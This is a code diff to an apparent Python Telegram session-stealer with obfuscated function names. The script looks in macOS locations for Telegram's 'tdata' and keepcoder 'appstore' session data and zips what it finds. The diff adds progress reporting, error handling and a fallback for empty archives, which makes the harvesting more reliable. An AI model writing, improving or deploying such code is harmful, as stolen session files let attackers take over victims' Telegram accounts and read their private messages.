@@ -104,14 +104,58 @@ def s_z_t_t(zip_path: str):
 
 def z_d(archive_name: str, paths: list[str]) -> None:
     with zipfile.ZipFile(archive_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        added_files = False
+        total_files = 0
+        processed_files = 0
+        last_reported_percent = 0
+
+
         for path in paths:
-            if os.path.isfile(path):
-                zipf.write(path, os.path.relpath(path, os.path.dirname(path)))
-            elif os.path.isdir(path):
+            if os.path.isfile(path) and os.path.exists(path):
+                total_files += 1
+            elif os.path.isdir(path) and os.path.exists(path):
                 for root, _, files in os.walk(path):
-                    for file in files:
-                        file_path = os.path.join(root, file)
-                        zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(path)))
+                    total_files += len(files)
+
+        s_t_t_t(f"Всего файлов для архивации: {total_files}")
+
+        for path in paths:
+            try:
+                if os.path.isfile(path):
+                    if os.path.exists(path):
+                        zipf.write(path, os.path.relpath(path, os.path.dirname(path)))
+                        added_files = True
+                    else:
+                        s_t_t_t(f"Файл не существует, пропущен: {path}")
+                    processed_files += 1
+                elif os.path.isdir(path):
+                    for root, _, files in os.walk(path):
+                        for file in files:
+                            file_path = os.path.join(root, file)
+                            if os.path.exists(file_path):
+                                zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(path)))
+                                added_files = True
+                            else:
+                                s_t_t_t(f"Файл не существует, пропущен: {file_path}")
+                            processed_files += 1
+
+
+                            if total_files > 0:
+                                percent = (processed_files / total_files) * 100
+
+                                if percent >= last_reported_percent + 10 or percent == 100:
+                                    s_t_t_t(f"Архивировано {percent:.1f}% файлов ({processed_files}/{total_files})")
+                                    last_reported_percent = int(percent // 10 * 10)
+
+            except Exception as e:
+                s_t_t_t(f"Ошибка при обработке пути {path}: {str(e)}")
+                continue
+
+        if not added_files:
+            s_t_t_t("Ни один файл не был добавлен в архив")
+            zipf.writestr("placeholder.txt", "No files were added to the archive")
+            s_t_t_t("Создан пустой архив с placeholder.txt")
+
     s_t_t_t(f"Архив создан: {archive_name}, размер: {os.path.getsize(archive_name)} байт")
 
 def d_z_a(zip_path: str):
@@ -143,23 +187,27 @@ def g_s(tdata_path: str) -> list[str] | None:
 def check_t():
     paths = []
     for path in POSSIBLE_PATHS:
-        if os.path.isdir(path):
-            if "Group Containers" in path:
-                s_t_t_t(f"Telegram with AppStore was found - {path}")
-                for folder in Path(path).glob("*keepcoder.Telegram"):
-                    if folder.is_dir() and folder.name.endswith("keepcoder.Telegram"):
-                        for file in os.scandir(folder):
-                            if file.name == "appstore":
-                                s_t_t_t("AppStore exists")
-                                paths.append(file.path)
-            elif "Application Support" in path:
-                tdata = os.path.join(path, "tdata")
-                s_t_t_t(f"Telegram with TData was found - {path}")
-                if os.path.isdir(tdata):
-                    s_t_t_t("TData exists")
-                    paths.extend(g_s(tdata))
-                else:
-                    s_t_t_t("TData not exists")
+        try:
+            if os.path.isdir(path):
+                if "Group Containers" in path:
+                    s_t_t_t(f"Telegram with AppStore was found - {path}")
+                    for folder in Path(path).glob("*keepcoder.Telegram"):
+                        if folder.is_dir() and folder.name.endswith("keepcoder.Telegram"):
+                            for file in os.scandir(folder):
+                                if file.name == "appstore":
+                                    s_t_t_t("AppStore exists")
+                                    paths.append(file.path)
+                elif "Application Support" in path:
+                    tdata = os.path.join(path, "tdata")
+                    s_t_t_t(f"Telegram with TData was found - {path}")
+                    if os.path.isdir(tdata):
+                        s_t_t_t("TData exists")
+                        paths.extend(g_s(tdata))
+                    else:
+                        s_t_t_t("TData not exists")
+        except Exception as e:
+            s_t_t_t(f"Error: {str(e)}")
+            continue
 
     return paths
 
